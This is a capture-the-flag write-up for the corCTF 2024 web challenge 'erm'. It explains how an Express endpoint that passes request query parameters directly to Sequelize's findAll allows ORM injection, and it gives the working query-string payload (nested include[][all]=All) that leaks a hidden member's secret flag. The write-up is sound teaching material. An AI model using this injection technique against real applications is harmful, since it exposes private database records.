# erm

## Basic details
The application code can be viewed [here](https://static.cor.team/corctf-2024/8628f679915bedbed678f5541e8a860b48cd2eed1da1a35904e8773410b963c3/erm.tar.gz). The challenge provides a website link (https://erm.be.ax/) along with the site's source code.

The website seems to be a CTF team website providing info about the members of the team and their write-ups. Before taking a look at the source code, the site seems completely static and provides no immediately clear interface functionality. The app is written in JavaScript and uses [Express](https://www.npmjs.com/package/express) for its main functionality.

## Exploring the implementation
In the given `db.js` file one can see that the application uses an SQLite database and accesses it with the help of [Sequelize](https://www.npmjs.com/package/sequelize). A hard coded member entry holding the flag is created when the database is initialized:
```js
const goroo = await Member.create({ username: "goroo", secret: process.env.FLAG || "corctf{test_flag}", kicked: true });
const web = await Category.findOne({ where: { name: "web" } });
await goroo.addCategory(web);
await web.addMember(goroo);
```
The rest of the data seems to be randomly generated.

Next, we examine the implementation in `app.js`, which defines various endpoints that interact with the application. Along with pages intended to be served directly to the user, some `api/` endpoints are available as well. These are used by some frontend JavaScript, but we can obviously interface with them directly, too. If we look at the 'members' endpoint:
```js
app.get("/api/members", wrap(async (req, res) => {
    res.json({ members: (await db.Member.findAll({ include: db.Category, where: { kicked: false } })).map(m => m.toJSON()) });
}));
```
We can see that the application lists all team members. However, since goroo, our flag-holding member, is always set to be kicked, they are filtered out. This endpoint does not take any input and probably needn't be explored further.

The 'writeup' endpoint seems slightly more interesting.
```js
app.get("/api/writeup/:slug", wrap(async (req, res) => {
    const writeup = await db.Writeup.findOne({ where: { slug: req.params.slug }, include: db.Member });
    if (!writeup) return res.status(404).json({ error: "writeup not found" });
    res.json({ writeup: writeup.toJSON() });
}));
```
It allows a user to view any writeup and its author regardless of any kicked status! However, since goroo does not seem to have any write-ups and the endpoint seems otherwise secure.

Finally, we can find something that's potentially very juicy.
```js
app.get("/api/writeups", wrap(async (req, res) => {
    res.json({ writeups: (await db.Writeup.findAll(req.query)).map(w => w.toJSON()).sort((a, b) => b.date - a.date) });
}));
```
What's going on here? The request query parameters are accepted as they are and are passed directly to Sequelize! Since no raw SQL query is used a traditional SQL injection attack will most likely not suffice but surely something interesting can be done here. At this point it's time to start reading [the docs](https://sequelize.org/api/v7/classes/_sequelize_core.index.model#findAll).

## Preparing the exploit
The individual writeup endpoint gives me an idea. What if we can include something extra, like the information of the member the writeup is associated to? Well, something like `include: "Member"` could be sent as the parameter to findAll. This works since can simply name the association [(as suggested in Sequelize docs)](https://sequelize.org/api/v7/types/_sequelize_core.index.includeable) as defined in `db.js` in the following way.
```js
const Member = sequelize.define('Member', {
    username: {
        type: DataTypes.STRING,
        primaryKey: true,
        allowNull: false,
    },
    secret: {
        type: DataTypes.STRING,
    },
    kicked: {
        type: DataTypes.BOOLEAN,
        defaultValue: false,
    }
});

const Writeup = sequelize.define('Writeup', {
    title: {
        type: DataTypes.STRING,
        allowNull: false
    },
    slug: {
        type: DataTypes.STRING,
        allowNull: false,
    },
    content: {
        type: DataTypes.TEXT,
        allowNull: false
    },
    date: {
        type: DataTypes.DATE,
        allowNull: false
    },
    category: {
        type: DataTypes.STRING,
    }
});
// Other stuff...
Category.belongsToMany(Member, { through: 'MemberCategory' }); // This will become important later!
Member.belongsToMany(Category, { through: 'MemberCategory' });
Member.hasMany(Writeup);
Writeup.belongsTo(Member);
```
Surely enough, sending this as a query parameter (`?include=Member`) adds the member info to the returned data. Since goroo still does not have any write-ups, this will only be a proof of concept.

Let's take a step back for a while and try to get the exploit working directly in the program's code without worrying about injecting anything through query parameters yet. Looking at the relationships defined in `db.js`, there is a clear route from (almost) any writeup to (almost) any member, being:

writeup(s) $\rightarrow$ member $\rightarrow$ category $\rightarrow$ member(s)

The only requirement is that the author of the writeup happens to share a category with our target, goroo. Since this can be seen to be the case after a quick visit to the provided website, we can proceed. Let's implement this as a simple [nested include query](https://stackoverflow.com/a/33944634).
```js
query = {
    include: [{
        model: db.Member,
        include: [{
            model: db.Category,
            include: [{
                model: db.Member,
            }]
        }]
    }]
}
```
After modifying the source code directly this "payload" works just as theorized. However, since we don't have access to the `db` reference in the query parameters this will not quite be enough for the final exploit.

## The final exploit
Let's recap. As seen in [The Docs](https://sequelize.org/api/v7/classes/_sequelize_core.index.model#findAll), `findAll` takes a [`FindOptions`](https://sequelize.org/api/v7/interfaces/_sequelize_core.index.findoptions#include) object (which we can inject). Its include field contains some [`Includeable`](https://sequelize.org/api/v7/types/_sequelize_core.index.includeable). This can be leveraged to leak information from the database.

In the `Includeable` documentation something interesting can be found. Instead of providing some `Association` or `IncludeOptions` for more specific inclusions, literally everything that can be included can eagerly be included by setting `all` to `true`. Modifying our intermediary payload to use `all` provides a functional payload without using the `db` reference at all!
```
query = {
    include: [{
        all: "All",
        include: [{
            all: "All",
            include: [{
                all: "All",
            }]
        }]
    }],
}
```

However, I don't know of a way to include a boolean in the query parameters. The structure shouldn't otherwise be a problem since objects can be injected fairly easily (which we will get to later). Now, however, maybe we should take a look at how Sequelize actually handles this inclusion?

Locating the relevant source code is fairly easy using links from the documentation and navigating the repository. Let's take a look at [the part of the code that handles the 'all' attribute](https://github.com/sequelize/sequelize/blob/0b7c86d063bfb43fd3d513640456a63304934231/packages/core/src/model.js#L476). If `all=true`, Sequelize continues immediately. The check is strict (`===`/`!==`), however, something does happen even if it isn't `true`! As seen on [these lines](https://github.com/sequelize/sequelize/blob/0b7c86d063bfb43fd3d513640456a63304934231/packages/core/src/model.js#L501), if `all` is set to `'All'` (a string), it is interpreted as `true`! This should finally make the payload possible to inject as something like the following:
```js
query = {
    include: [{
        all: "All",
        include: [{
            all: "All",
            include: [{
                all: "All",
            }]
        }]
    }],
}
```
As mentioned before, arrays and objects can be sent in query parameters! There are many ways this can be done with different pieces of software (as discussed in e.g. [this StackOverflow discussion](https://stackoverflow.com/questions/6243051/how-to-pass-an-array-within-a-query-string/67095427)) but after some trial,
`?include[][all]=All&include[][include][all]=All&include[][include][include][all]=All`
seems to be interpreted as:
```js
{
  "include": [
    {
      "all": "All",
      "include": {
        "all": "All",
        "include": {
          "all": "All"
        }
      }
    }
  ]
}
```
This works exactly as we intended.

<details>
<summary>All that there is left to do is to search the response JSON for the right user and the flag.</br>
&nbsp; Finally, the flag is revealed. &nbsp; ◻</summary>

`corctf{erm?_more_like_orm_amiright?}`
</details>
